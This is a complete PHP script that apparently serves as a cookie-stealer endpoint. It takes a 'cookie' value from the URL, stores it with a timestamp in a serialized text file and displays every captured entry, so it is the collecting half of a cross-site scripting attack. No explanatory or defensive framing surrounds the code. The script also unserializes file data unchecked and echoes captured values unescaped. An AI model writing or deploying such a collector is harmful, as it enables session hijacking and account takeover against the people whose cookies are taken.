<?php
$filename = 'cookies.txt';

if ($data = @file_get_contents($filename)) {
    $data = unserialize(($data));
} else {
    $data = array();
}

if (isset($_GET['cookie'])) {
    $data[] = array(
        'timestamp' => time(),
        'data' => $_GET['cookie']
    );
    file_put_contents($filename, serialize($data));
}

$data = array_reverse($data);
foreach ($data as $item) {
    echo '<p>' . date(DATE_RFC1123, $item['timestamp']) . ' :: ' . $item['data'] . '</p>';
}